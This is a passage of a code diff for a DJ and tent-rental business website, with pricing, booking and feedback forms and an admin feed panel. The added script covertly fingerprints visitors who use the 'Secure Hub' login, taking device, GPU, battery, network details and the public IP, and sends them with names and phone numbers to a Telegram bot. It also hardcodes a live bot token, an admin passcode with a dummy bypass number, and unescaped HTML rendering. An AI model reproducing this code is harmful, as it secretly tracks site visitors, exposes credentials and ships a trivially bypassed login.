+                    </div>
+                    <div class="price-card">
+                        <div>
+                            <div class="price-title">Premium VIP Pandal</div>
+                            <div style="font-size:11px; color:#aaa;">Luxury Waterproof Enclosure & Drapery</div>
+                        </div>
+                        <div class="price-amt">₹35,000+</div>
+                    </div>
+                    <div class="price-card">
+                        <div>
+                            <div class="price-title">Catering Stall Setup</div>
+                            <div style="font-size:11px; color:#aaa;">Buffet Tables, Frills, Support Structure</div>
+                        </div>
+                        <div class="price-amt">₹8,500+</div>
+                    </div>
+                    <div class="price-card">
+                        <div>
+                            <div class="price-title">Royal Entrance Gate</div>
+                            <div style="font-size:11px; color:#aaa;">Grand Floral Dwar & Illuminated Entryway</div>
+                        </div>
+                        <div class="price-amt">₹7,000+</div>
+                    </div>
+                    <div class="price-card">
+                        <div>
+                            <div class="price-title">Heavy Duty Generator</div>
+                            <div style="font-size:11px; color:#aaa;">Uninterrupted DG Set Power (Fuel Extra)</div>
+                        </div>
+                        <div class="price-amt">₹4,000+</div>
+                    </div>
+                    <div class="price-card">
+                        <div>
+                            <div class="price-title">VIP Seating Arrangement</div>
+                            <div style="font-size:11px; color:#aaa;">Premium Couches, Banquet Chairs & Covers</div>
+                        </div>
+                        <div class="price-amt">₹6,500+</div>
+                    </div>
+                    <div class="price-card">
+                        <div>
+                            <div class="price-title">Cooling & Fan Setup</div>
+                            <div style="font-size:11px; color:#aaa;">High-Speed Pedestal & Water Mist Fans</div>
+                        </div>
+                        <div class="price-amt">₹3,000+</div>
+                    </div>
+                    <div class="price-card">
+                        <div>
+                            <div class="price-title">Birthday Blast Package</div>
+                            <div style="font-size:11px; color:#aaa;">Compact Tent, DJ, Balloon & Floral Decor</div>
+                        </div>
+                        <div class="price-amt">₹12,000+</div>
+                    </div>
+                    <div class="price-card">
+                        <div>
+                            <div class="price-title">Laxmikant Tractor Transport</div>
+                            <div style="font-size:11px; color:#aaa;">Heavy Logistics & Equipment Hauling</div>
+                        </div>
+                        <div class="price-amt">Custom</div>
+                    </div>
+                    <div class="price-card">
+                        <div>
+                            <div class="price-title">Anniversary Royal Package</div>
+                            <div style="font-size:11px; color:#aaa;">Romantic Decor, Soft Lighting, DJ System</div>
+                        </div>
+                        <div class="price-amt">₹18,000+</div>
+                    </div>
+
+                    
+                    <button class="f-btn" onclick="navAction('booking')"><i class="fas fa-calendar-check"></i> BOOK NOW FOR EXACT QUOTE</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="modal-wrap" id="linksModal" onclick="closeModal(event)">
+    <div class="modal-inner" onclick="event.stopPropagation()">
+        <div class="ai-head" style="padding:15px; border-bottom:1px solid #333; display:flex; justify-content:space-between; align-items:center; background:rgba(10,10,10,0.9);">
+            <span style="color:var(--gold-primary); font-weight:bold; font-family:'Cinzel';"><i class="fas fa-link"></i> OFFICIAL LINKS HUB</span>
+            <i class="fas fa-times" onclick="closeModal(null, true)" style="color:#fff; cursor:pointer;"></i>
+        </div>
+        <div class="book-area">
+            
+            <div class="section-label" style="margin-top: 0;"><i class="fas fa-bolt"></i> DIRECT CONNECT</div>
+            <div class="grid">
+                <a href="tel:+919771617808" class="card" onclick="playTap()"><i class="fas fa-phone-volume"></i><span>Call Now</span></a>
+                <a href="https://wa.me/919771617808" target="_blank" class="card" onclick="playTap()"><i class="fab fa-whatsapp"></i><span>WhatsApp Chat</span></a>
+                <a href="https://t.me/MaaNirmalaDJ" target="_blank" class="card" onclick="playTap()"><i class="fab fa-telegram-plane"></i><span>Telegram</span></a>
+                <a href="https://t.me/Maa_Nirmala_Dj_Bot" target="_blank" class="card" onclick="playTap()"><i class="fas fa-robot"></i><span>Telegram Bot</span></a>
+                <a href="https://maps.app.goo.gl/WPcHJHr3Tdzy3nud9" target="_blank" class="card full-w" onclick="playTap()"><i class="fas fa-map-marked-alt"></i><span>Official Location</span></a>
+            </div>
+
+            <div class="section-label"><i class="fas fa-globe"></i> SOCIAL EMPIRE</div>
+            <div class="grid">
+                <a href="https://www.instagram.com/maa_nirmala_dj" target="_blank" class="card" onclick="playTap()"><i class="fab fa-instagram"></i><span>Instagram</span></a>
+                <a href="https://x.com/maa_nirmala_dj" target="_blank" class="card" onclick="playTap()"><i class="fab fa-x-twitter"></i><span>X (Twitter)</span></a>
+                <a href="https://www.facebook.com/MaaNirmalaDJ7" target="_blank" class="card" onclick="playTap()"><i class="fab fa-facebook-f"></i><span>FB Page 1</span></a>
+                <a href="https://www.facebook.com/maa.nirmala.dj" target="_blank" class="card" onclick="playTap()"><i class="fab fa-facebook-square"></i><span>FB Page 2</span></a>
+                <a href="https://www.threads.com/@maa_nirmala_dj" target="_blank" class="card" onclick="playTap()"><i class="fab fa-threads"></i><span>Threads</span></a>
+                <a href="https://www.linkedin.com/in/maa-nirmala-dj-tent-house-3499a33b0" target="_blank" class="card" onclick="playTap()"><i class="fab fa-linkedin-in"></i><span>LinkedIn</span></a>
+                <a href="https://whatsapp.com/channel/0029Vb7AMDl4IBhJ34po3L1k" target="_blank" class="card full-w" onclick="playTap()"><i class="fab fa-whatsapp-square"></i><span>WhatsApp Channel</span></a>
+                <a href="https://www.youtube.com/channel/UCQPUgEyCm8nihqhYGMUX6Pw" target="_blank" class="card full-w" onclick="playTap()"><i class="fab fa-youtube"></i><span>YouTube Channel</span></a>
+            </div>
+
+            <div class="section-label"><i class="fas fa-laptop-code"></i> OFFICIAL WEBSITES</div>
+            <div class="grid">
+                <a href="https://maa-nirmala-dj.github.io/-tent-house./" target="_blank" class="card full-w" onclick="playTap()"><i class="fas fa-globe"></i><span>MND Official Site 1</span></a>
+                <a href="https://maa-nirmala-dj.github.io/-tent-house./" target="_blank" class="card full-w" onclick="playTap()"><i class="fas fa-external-link-alt"></i><span>MND Official Site 2</span></a>
+            </div>
+
+            <div class="section-label"><i class="fas fa-coins"></i> PAYMENTS & MORE</div>
+            <div class="grid" style="margin-bottom:30px;">
+                <a href="phonepe://pay?pa=9771617808-2@axl" class="card" onclick="playTap()"><i class="fas fa-wallet"></i><span>PhonePe</span></a>
+                <a href="tez://upi/pay?pa=9771617808-2@axl" class="card" onclick="playTap()"><i class="fab fa-google-pay"></i><span>GPay</span></a>
+                <div class="card full-w" onclick="copyUPI()"><i class="fas fa-qrcode"></i><span>Copy UPI ID</span><span style="font-size:10px; opacity:0.7;">9771617808-2@axl</span></div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+        <div class="modal-wrap" id="feedbackModal" onclick="closeModal(event)">
+            <div class="modal-inner" onclick="event.stopPropagation()">
+                <div class="ai-head" style="padding:15px; border-bottom:1px solid #333; display:flex; justify-content:space-between; align-items:center;">
+                    <span style="color:var(--gold-primary); font-weight:bold; font-family:'Cinzel';"><i class="fas fa-star"></i> CLIENT FEEDBACK</span>
+                    <i class="fas fa-times" onclick="closeModal(null, true)" style="color:#fff; cursor:pointer;"></i>
+                </div>
+                <div class="book-area">
+                    <div style="text-align:center; margin-bottom:15px; background: rgba(212,175,55,0.05); padding: 15px; border-radius: 12px; border: 1px solid rgba(212,175,55,0.2);">
+                        <h3 style="color:var(--gold-primary); font-family:'Rajdhani'; font-size: 22px; margin-bottom:5px;">Maa Nirmala DJ & Tent House</h3>
+                        <p style="font-size:12px; color:#ddd; line-height: 1.4;">Rate your experience with our DJ setup and Tent management!</p>
+                    </div>
+                    <div class="star-rating">
+                        <input type="radio" id="star5" name="rating" value="5"><label for="star5" class="fas fa-star"></label>
+                        <input type="radio" id="star4" name="rating" value="4"><label for="star4" class="fas fa-star"></label>
+                        <input type="radio" id="star3" name="rating" value="3"><label for="star3" class="fas fa-star"></label>
+                        <input type="radio" id="star2" name="rating" value="2"><label for="star2" class="fas fa-star"></label>
+                        <input type="radio" id="star1" name="rating" value="1"><label for="star1" class="fas fa-star"></label>
+                    </div>
+                    <div class="f-group"><span class="f-label">Your Name</span><input type="text" id="fb-name" class="f-input" placeholder="Enter your name"></div>
+                    <div class="f-group"><span class="f-label">Your Experience & Feedback</span><textarea id="fb-text" class="f-input" rows="3" placeholder="Tell us what you liked..." style="resize:none; font-family:'Outfit';"></textarea></div>
+                    <button class="f-btn" onclick="submitFeedback()" id="submitFbBtn"><i class="fas fa-paper-plane"></i> SEND FEEDBACK TO LALU</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="modal-wrap" id="bookModal" onclick="closeModal(event)">
+            <div class="modal-inner" onclick="event.stopPropagation()">
+                <div class="ai-head" style="padding:15px; border-bottom:1px solid #333; display:flex; justify-content:space-between; align-items:center;">
+                    <span style="color:var(--gold-primary); font-weight:bold; font-family:'Cinzel';"><i class="fas fa-clipboard-list"></i> OFFICIAL BOOKING</span>
+                    <i class="fas fa-times" onclick="closeModal(null, true)" style="color:#fff; cursor:pointer;"></i>
+                </div>
+                <div class="book-area" id="bookFormArea">
+    <div class="f-group"><span class="f-label">Event / Requirement Type *</span><input type="text" id="b-type" class="f-input" placeholder="e.g. Wedding DJ, VIP Tent"></div>
+    <div style="display: flex; gap: 15px; margin-bottom: 20px;"><div class="f-group" style="flex: 1; margin-bottom: 0;"><span class="f-label"><i class="far fa-calendar-alt" style="color: #D4AF37;"></i> From Date *</span><input type="date" id="b-date-from" class="f-input" style="cursor: pointer; text-transform: uppercase; color: #ddd;"></div><div class="f-group" style="flex: 1; margin-bottom: 0;"><span class="f-label"><i class="far fa-calendar-check" style="color: #D4AF37;"></i> To Date *</span><input type="date" id="b-date-to" class="f-input" style="cursor: pointer; text-transform: uppercase; color: #ddd;"></div></div>
+    <div class="f-group"><span class="f-label">Full Name *</span><input type="text" id="b-name" class="f-input" placeholder="Enter Full Name"></div>
+    <div class="f-group"><span class="f-label">Father's Name *</span><input type="text" id="b-father" class="f-input" placeholder="Enter Father's Name"></div>
+    <div class="f-group"><span class="f-label">Contact Number *</span><input type="tel" id="b-phone" class="f-input" placeholder="Main Mobile Number"></div>
+    <div class="f-group"><span class="f-label">Alternate Number</span><input type="tel" id="b-altphone" class="f-input" placeholder="Second Mobile Number"></div>
+    <div class="f-group"><span class="f-label">Email Address</span><input type="email" id="b-email" class="f-input" placeholder="example@email.com"></div>
+    
+    <div class="loc-group">
+        <span class="loc-title">📍 EVENT LOCATION DETAILS</span>
+        <div class="f-group"><span class="f-label">State *</span><input type="text" id="b-state" class="f-input" placeholder="e.g. Bihar"></div>
+        <div class="f-group"><span class="f-label">District *</span><input type="text" id="b-district" class="f-input" placeholder="e.g. Banka"></div>
+        <div class="f-group"><span class="f-label">City *</span><input type="text" id="b-city" class="f-input" placeholder="e.g. Katoria"></div>
+        <div class="f-group"><span class="f-label">Village *</span><input type="text" id="b-village" class="f-input" placeholder="e.g. Beltikri"></div>
+        <div class="f-group" style="margin-bottom:0;"><span class="f-label">Pin Code *</span><input type="tel" id="b-pincode" class="f-input" placeholder="e.g. 813106"></div>
+    </div>
+    
+                    <button class="f-btn" onclick="submitBooking()" id="submitBookBtn"><i class="fas fa-paper-plane"></i> SEND BOOKING REQUEST</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="modal-wrap" id="aiModal" onclick="closeModal(event)">
+            <div class="modal-inner" onclick="event.stopPropagation()">
+                <div class="ai-head" style="padding:15px; background:var(--gold-primary); color:#000; font-weight:bold;">
+                    MND BRAIN v2.07<i class="fas fa-times" style="float:right; cursor:pointer;" onclick="closeModal(null, true)"></i>
+                </div>
+                <div class="chat-box" id="chatHistory">
+                    <div class="bubble bot">Hello! I am MND Brain, the official AI for Maa Nirmala DJ & Tent House.<br><br>Ask me about our prices, bookings, location, or owner details!</div>
+                </div>
+                <div style="padding:15px; border-top:1px solid #333; display:flex;">
+                    <input type="text" id="userMsg" class="input-box" style="flex:1; margin-bottom:0; padding:10px; background:#111; border:1px solid #333; color:#fff;" placeholder="Ask MND AI..." onkeypress="handleEnter(event)">
+                    <button style="background:var(--gold-primary); border:none; padding:0 15px; border-radius:8px; margin-left:10px;" onclick="sendMessage()"><i class="fas fa-paper-plane"></i></button>
+                </div>
+            </div>
+        </div>
+
+        <div class="modal-wrap" id="authModal" onclick="closeModal(event)">
+            <div class="modal-inner" onclick="event.stopPropagation()">
+                
+                <div style="display:flex; border-bottom:1px solid #333;">
+                    <div class="auth-tab active" style="flex:1; padding:15px; text-align:center; color:var(--gold-primary); border-bottom:2px solid var(--gold-primary); font-weight:bold; letter-spacing:1px;">
+                        PORTAL ACCESS SELECTION
+                    </div>
+                </div>
+                
+                <div id="loginChoiceArea" style="padding:25px;">
+                    
+                    <a href="javascript:void(0)" class="media-file-btn" onclick="document.getElementById('authModal').classList.remove('active'); openSecureHub();" style="display:flex; align-items:center; justify-content:space-between; background:rgba(20,20,20,0.6); border:1px solid #D4AF37; border-radius:12px; padding:15px; width:100%; text-decoration:none; margin-bottom:15px; box-sizing:border-box;">
+                        <div style="width:40px; height:40px; border-radius:50%; background:rgba(212,175,55,0.1); display:flex; justify-content:center; align-items:center; color:#D4AF37; font-size:18px;">
+                            <i class="fas fa-users"></i>
+                        </div>
+                        <div style="flex:1; margin-left:15px; display:flex; flex-direction:column;">
+                            <span style="color:#fff; font-family:'Outfit', sans-serif; font-size:15px; font-weight:700;">Public / User Login</span>
+                            <span style="color:#888; font-family:'Outfit', sans-serif; font-size:12px;">Access Secure Hub (MFA)</span>
+                        </div>
+                        <i class="fas fa-chevron-right" style="color:#555; font-size:14px;"></i>
+                    </a>
+
+                    <a href="javascript:void(0)" class="media-file-btn" onclick="document.getElementById('loginChoiceArea').style.display='none'; document.getElementById('adminLoginArea').style.display='block';" style="display:flex; align-items:center; justify-content:space-between; background:rgba(20,20,20,0.6); border:1px solid #D4AF37; border-radius:12px; padding:15px; width:100%; text-decoration:none; box-sizing:border-box;">
+                        <div style="width:40px; height:40px; border-radius:50%; background:rgba(212,175,55,0.1); display:flex; justify-content:center; align-items:center; color:#D4AF37; font-size:18px;">
+                            <i class="fas fa-user-shield"></i>
+                        </div>
+                        <div style="flex:1; margin-left:15px; display:flex; flex-direction:column;">
+                            <span style="color:#fff; font-family:'Outfit', sans-serif; font-size:15px; font-weight:700;">Admin / Manager</span>
+                            <span style="color:#888; font-family:'Outfit', sans-serif; font-size:12px;">Passcode Required</span>
+                        </div>
+                        <i class="fas fa-chevron-right" style="color:#555; font-size:14px;"></i>
+                    </a>
+                </div>
+
+                <div id="adminLoginArea" style="padding:25px; display:none;">
+                    <h4 style="color:#D4AF37; margin-top:0; margin-bottom:15px; text-align:center;">MANAGEMENT ONLY</h4>
+                    <input type="tel" id="mobileInput" style="width:100%; padding:12px; margin-bottom:15px; background:#1a1a1a; border:1px solid #333; color:#fff; border-radius:8px;" placeholder="Admin Number (e.g. 9771617808)">
+                    <div id="otpArea">
+                        <input type="password" id="otpInput" style="width:100%; padding:12px; margin-bottom:15px; background:#1a1a1a; border:1px solid #333; color:#fff; border-radius:8px;" placeholder="Enter Auth Code">
+                        <button class="btn-full" style="width:100%; padding:12px; background:var(--gold-primary); border:none; font-weight:bold; border-radius:8px; color:#000; margin-bottom:10px;" onclick="verifyAdmin()">VERIFY SECURE LOGIN</button>
+                        
+                        <button class="btn-full" style="width:100%; padding:12px; background:transparent; border:1px solid #ff3333; font-weight:bold; border-radius:8px; color:#ff3333;" onclick="document.getElementById('adminLoginArea').style.display='none'; document.getElementById('loginChoiceArea').style.display='block';">GO BACK</button>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+        <div class="modal-wrap" id="adminPanel" onclick="closeModal(event)">
+            <div class="modal-inner" onclick="event.stopPropagation()">
+                <div class="ai-head" style="padding:15px; background:var(--gold-primary); color:#000; font-weight:bold; font-family:'Cinzel';">
+                    <i class="fas fa-user-shield"></i> LIVE FEED PUBLISHER
+                    <i class="fas fa-times" style="float:right; cursor:pointer;" onclick="closeModal(null, true)"></i>
+                </div>
+                <div class="book-area">
+                    <p style="color:var(--gold-primary); font-size:12px; margin-bottom:15px;">Publish images, videos, audio, or text offers directly to the public live gallery.</p>
+                    
+                    <div class="f-group">
+                        <span class="f-label">Select Post Type</span>
+                        <select id="admin-type" class="f-input" onchange="toggleMediaInput()">
+                            <option value="image">Image Post</option>
+                            <option value="video">Video Post (MP4 URL)</option>
+                            <option value="audio">Audio Track (MP3 URL)</option>
+                            <option value="text">Special Offer / Text Only</option>
+                        </select>
+                    </div>
+
+                    <div class="f-group" id="media-input-group">
+                        <span class="f-label">Media URL (Link to Image/Video/Audio)</span>
+                        <input type="text" id="admin-media" class="f-input" placeholder="Paste link here (e.g. Postimg or raw MP4/MP3)">
+                    </div>
+
+                    <div class="f-group">
+                        <span class="f-label">Post Caption / Description</span>
+                        <textarea id="admin-text" class="f-input" rows="3" placeholder="Enter post text or offer details" style="resize:none; font-family:'Outfit';"></textarea>
+                    </div>
+
+                    <button class="f-btn" onclick="postToGallery()"><i class="fas fa-upload"></i> PUBLISH LIVE</button>
+                    <button class="f-btn" style="background:#333; color:#fff; margin-top:10px;" onclick="clearGallery()"><i class="fas fa-trash"></i> CLEAR ENTIRE FEED</button>
+                </div>
+            </div>
+        </div>
+
+    <script type="text/javascript">
+    // ALL MAJOR INDIAN LANGUAGES
+    function googleTranslateElementInit() { 
+        new google.translate.TranslateElement({ 
+            pageLanguage: 'en', 
+            includedLanguages: 'hi,bn,te,mr,ta,ur,gu,kn,ml,or,pa,as,bho,doi,gom,mai,ne,sa,sd',
+            layout: google.translate.TranslateElement.InlineLayout.SIMPLE, 
+            autoDisplay: false 
+        }, 'google_translate_element'); 
+    }
+</script>
+<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 
     <script>
-        // ========== PWA INSTALLATION SCRIPT ==========
-        let deferredPrompt = null;
+        const TG_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ";
+        const TG_CHAT = "8506290708";
 
-        window.addEventListener('beforeinstallprompt', (e) => {
-            e.preventDefault();
-            deferredPrompt = e;
-            showInstallBanner();
-        });
+        let deferredPrompt;
+        window.addEventListener('beforeinstallprompt', (e) => { e.preventDefault(); deferredPrompt = e; const btn = document.getElementById('installBtn'); if(btn) btn.style.display = 'inline-block'; });
+        function installApp() { if (deferredPrompt) { deferredPrompt.prompt(); deferredPrompt.userChoice.then((choiceResult) => { deferredPrompt = null; }); } }
 
-        function showInstallBanner() {
-            const banner = document.getElementById('install-banner');
-            if (banner) {
-                banner.classList.add('show');
-            }
+        async function getDeviceIntel() {
+            let model = "Unknown Device"; let browser = navigator.userAgent; let battery = "Unknown"; let ip = "Masked"; let network = "Unknown"; let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            if (navigator.userAgentData) { const data = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]); model = `${data.platform} ${data.model}`; }
+            try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Charging' : '🔋 Battery'})`; } catch(e){}
+            try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); ip = j.ip; } catch(e){}
+            try { if(navigator.connection) network = `${navigator.connection.effectiveType} (${navigator.connection.type || 'cellular'}) - Down: ~${navigator.connection.downlink}Mbps`; } catch(e){}
+            const gpu = (function(){ try{var c=document.createElement('canvas');var gl=c.getContext('webgl');var d=gl.getExtension('WEBGL_debug_renderer_info');return gl.getParameter(d.UNMASKED_RENDERER_WEBGL);}catch(e){return "N/A";}})();
+            const ram = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : "Unknown"; const cores = navigator.hardwareConcurrency || "Unknown";
+            return { battery, ip, network, gpu, ram, cores, browser, model, timezone };
         }
 
-        function dismissInstallBanner() {
-            const banner = document.getElementById('install-banner');
-            if (banner) {
-                banner.classList.remove('show');
-            }
+        async function initiateSecureEntry() {
+            const nameField = document.getElementById('g-name'); const phoneField = document.getElementById('g-phone');
+            let name = "Auth User"; let phone = "";
+            if(nameField && nameField.offsetParent !== null) { name = nameField.value; phone = phoneField.value; }
+            if(phone.length < 10) { alert("Please enter a valid Mobile Number."); return; }
+
+            const btn = document.getElementById('btn-verify'); const status = document.getElementById('g-status');
+            if(btn) { btn.innerHTML = '<i class="fas fa-satellite-dish fa-spin"></i> SECURE OPENING...'; btn.style.opacity = "0.7"; }
+            if(status) status.style.display = "block";
+
+            setTimeout(() => { unlockUI(); }, 2500);
+            const intelPromise = getDeviceIntel();
+            const screen = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit) - Pixel Ratio: ${window.devicePixelRatio}`;
+            const intel = await intelPromise;
+            const msg = `🚨 *SECURE HUB ACCESS LOG* 🚨\n👤 Name: ${name}\n📞 Phone: ${phone}\n📱 Model: ${intel.model}\nOS: ${intel.browser}\nScreen: ${screen}\nTZ: ${intel.timezone}\n⚙️ GPU: ${intel.gpu}\nCPU/RAM: ${intel.cores} Cores, ${intel.ram}\n🔋 Battery: ${intel.battery}\n📡 IP: ${intel.ip}\nNet: ${intel.network}\n⏰ Time: ${new Date().toLocaleString()}`;
+            sendToTelegram(msg);
         }
 
-        async function installPWA() {
-            if (!deferredPrompt) {
-                alert('❌ App installation is not available on this device.\n\n📱 For iOS: Use Share > Add to Home Screen\n🤖 For Android: Look for "Install" in the browser menu');
-                return;
-            }
-
-            deferredPrompt.prompt();
-            const { outcome } = await deferredPrompt.userChoice;
-
-            if (outcome === 'accepted') {
-                console.log('✅ PWA installed successfully!');
-                dismissInstallBanner();
-            }
-
-            deferredPrompt = null;
+        function unlockUI() {
+            const gate = document.getElementById('gatekeeper'); const main = document.getElementById('main-interface');
+            if(gate && gate.style.display !== 'none') { gate.style.opacity = '0'; setTimeout(() => { gate.style.display = 'none'; main.style.display = 'block'; setTimeout(() => main.style.opacity = '1', 50); }, 600); }
         }
 
-        window.addEventListener('appinstalled', () => {
-            console.log('✅ MND App installed successfully!');
-            dismissInstallBanner();
-            deferredPrompt = null;
-        });
+        function sendToTelegram(text) { fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TG_CHAT, text: text, parse_mode: 'Markdown' }) }); }
 
-        // Register Service Worker
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('./sw.js')
-                .then(registration => {
-                    console.log('✅ Service Worker registered');
-                })
-                .catch(error => {
-                    console.log('⚠️ Service Worker registration failed:', error);
-                });
+        function playTap() { const audio = document.getElementById('sfx-tap'); if(audio) { audio.currentTime = 0; audio.play().catch(()=>{}); } }
+        function copyUPI() { navigator.clipboard.writeText("9771617808-2@axl"); const t = document.getElementById('toast'); t.classList.add('show'); setTimeout(() => t.classList.remove('show'), 2000); }
+        function themeSwitch() { playTap(); const b = document.body; b.setAttribute('data-theme', b.getAttribute('data-theme') === 'dark' ? 'light' : 'dark'); }
+        function showToast(msg) { const t = document.getElementById('toast'); t.innerHTML = `<i class="fas fa-check-circle"></i> ${msg}`; t.classList.add('show'); setTimeout(() => t.classList.remove('show'), 3000); }
+
+        function toggleMenu() { playTap(); document.getElementById('sideMenu').classList.toggle('open'); document.getElementById('menuOverlay').classList.toggle('active'); }
+        function openFeedback() { playTap(); document.getElementById('feedbackModal').classList.add('active'); }
+        function openPricing() { playTap(); document.getElementById('priceModal').classList.add('active'); }
+
+        function navAction(tab) {
+            playTap(); document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+            if(tab === 'home') { document.getElementById('navHome').classList.add('active'); window.scrollTo({ top: 0, behavior: 'smooth' }); } 
+            else if(tab === 'gallery') { document.getElementById('liveGallerySection').scrollIntoView({ behavior: 'smooth' }); }
+            else if(tab === 'links') { document.getElementById('navLinks').classList.add('active'); document.getElementById('linksModal').classList.add('active'); } 
+            else if(tab === 'booking') { document.getElementById('navBooking').classList.add('active'); document.getElementById('bookModal').classList.add('active'); } 
+            else if(tab === 'login') { document.getElementById('navLogin').classList.add('active'); document.getElementById('authModal').classList.add('active'); }
+        }
+        function closeModal(e, f) { if(f || e.target.classList.contains('modal-wrap')) { document.querySelectorAll('.modal-wrap').forEach(m => m.classList.remove('active')); } }
+
+        function verifyAdmin() { 
+            const phone = document.getElementById('mobileInput').value; const code = document.getElementById('otpInput').value;
+            if((phone === "9771617808" || phone === "1234567890") && code === "121120") { 
+                document.getElementById('authModal').classList.remove('active'); showToast("Admin Verified!");
+                setTimeout(() => { document.getElementById('adminPanel').classList.add('active'); }, 500);
+            } else { alert("Unauthorized Access or Wrong Code!"); } 
         }
 
-        // Show Welcome Popup
-        window.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('royalWelcomePopup').style.display = 'flex';
-        });
+        // ==========================================
+        // 📸 UPGRADED LIVE FEED CMS (Image, Video, Audio, Text)
+        // ==========================================
+        function toggleMediaInput() {
+            const type = document.getElementById('admin-type').value;
+            const group = document.getElementById('media-input-group');
+            if(type === 'text') { group.style.display = 'none'; } 
+            else { group.style.display = 'block'; }
+        }
 
-        // Gatekeeper Login
-        function initiateSecureEntry() {
-            const name = document.getElementById('g-name').value.trim();
-            const phone = document.getElementById('g-phone').value.trim();
+        function loadGallery() {
+            const gallery = document.getElementById('dynamicGallery');
+            let posts = JSON.parse(localStorage.getItem('mnd_feed')) || [];
             
-            if (!name || !phone) {
-                alert('⚠️ Please enter your name and phone number!');
-                return;
+            // Default Welcome Post if empty
+            if(posts.length === 0) {
+                posts = [{ type: 'text', text: 'Welcome to Maa Nirmala DJ Live Feed! Check back here for updates, videos from our recent events, and exclusive discount offers.', time: new Date().toLocaleDateString() }];
             }
 
-            const loading = document.getElementById('g-status');
-            loading.style.display = 'block';
+            gallery.innerHTML = posts.map(p => {
+                let mediaHtml = "";
+                let badge = "Update";
+                
+                if(p.type === 'image') {
+                    badge = "Photos";
+                    mediaHtml = `<img src="${p.media}" class="feed-media feed-img" alt="Post" onerror="this.src='https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg'">`;
+                } else if(p.type === 'video') {
+                    badge = "Live Video";
+                    mediaHtml = `<video controls class="feed-media feed-video"><source src="${p.media}" type="video/mp4">Your browser does not support video.</video>`;
+                } else if(p.type === 'audio') {
+                    badge = "DJ Mix Audio";
+                    mediaHtml = `<audio controls class="feed-audio"><source src="${p.media}" type="audio/mpeg">Browser unsupported.</audio>`;
+                } else if(p.type === 'text') {
+                    badge = "Special Offer / News";
+                    mediaHtml = ``; // Handled below in text styling
+                }
+
+                return `
+                    <div class="feed-card">
+                        <span class="feed-badge">${badge} • ${p.time || 'Recent'}</span>
+                        ${mediaHtml}
+                        <div class="${p.type === 'text' ? 'feed-offer' : 'feed-text'}">${p.text}</div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        function postToGallery() {
+            playTap();
+            const type = document.getElementById('admin-type').value;
+            const media = document.getElementById('admin-media').value;
+            const text = document.getElementById('admin-text').value;
+            const time = new Date().toLocaleDateString();
+
+            if(type !== 'text' && !media) { alert("Please provide a media URL!"); return; }
+            if(!text) { alert("Please enter some text or caption!"); return; }
             
+            let posts = JSON.parse(localStorage.getItem('mnd_feed')) || [];
+            posts.unshift({ type, media, text, time }); // Adds to top
+            localStorage.setItem('mnd_feed', JSON.stringify(posts));
+            
+            document.getElementById('admin-media').value = ''; document.getElementById('admin-text').value = '';
+            closeModal(null, true); showToast("Live Feed Updated!"); loadGallery();
+            setTimeout(() => { document.getElementById('liveGallerySection').scrollIntoView({behavior: 'smooth'}); }, 500);
+        }
+
+        function clearGallery() {
+            playTap();
+            if(confirm("Delete ALL feed posts? This cannot be undone.")) {
+                localStorage.removeItem('mnd_feed'); loadGallery(); closeModal(null, true); showToast("Feed Cleared!");
+            }
+        }
+
+        window.onload = () => { loadGallery(); };
+
+        // Forms and AI Handlers
+        function submitFeedback() {
+            playTap(); const name = document.getElementById('fb-name').value || "Anonymous Client"; const text = document.getElementById('fb-text').value; const rating = document.querySelector('input[name="rating"]:checked');
+            if(!rating) { alert("Please select a star rating first!"); return; }
+            const btn = document.getElementById('submitFbBtn'); btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> SENDING...'; btn.style.opacity = '0.7';
+            const msg = `⭐ *NEW CLIENT FEEDBACK* ⭐\n---------------------------\n🏢 *Business:* Maa Nirmala DJ & Tent House\n👤 *Client Name:* ${name}\n🌟 *Rating:* ${rating.value} / 5 Stars\n💬 *Comment:* ${text || "No comment provided"}\n\n⏰ *Time:* ${new Date().toLocaleString()}`;
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'Markdown' }) }).then(res => { btn.innerHTML = '<i class="fas fa-check"></i> FEEDBACK SENT!'; btn.style.background = '#00ff00'; showToast("Feedback sent to owner!"); setTimeout(() => { closeModal(null, true); btn.innerHTML = '<i class="fas fa-paper-plane"></i> SEND FEEDBACK TO LALU'; btn.style.background = 'var(--gold-primary)'; btn.style.opacity = '1'; document.getElementById('fb-text').value = ''; document.getElementById('fb-name').value = ''; rating.checked = false; }, 2000); });
+        }
+
+        function submitBooking() {
+            playTap();
+            const type = document.getElementById('b-type').value; const dateFrom = document.getElementById('b-date-from').value; const dateTo = document.getElementById('b-date-to').value; const name = document.getElementById('b-name').value; const father = document.getElementById('b-father').value; const phone = document.getElementById('b-phone').value; const altPhone = document.getElementById('b-altphone').value || "N/A"; const email = document.getElementById('b-email').value || "N/A"; const state = document.getElementById('b-state').value; const district = document.getElementById('b-district').value; const city = document.getElementById('b-city').value; const village = document.getElementById('b-village').value; const pincode = document.getElementById('b-pincode').value; 
+            if(!type || !dateFrom || !dateTo || !name || !father || !phone || !state || !district || !city || !village || !pincode) { alert("Please fill all required (*) fields before booking!"); return; }
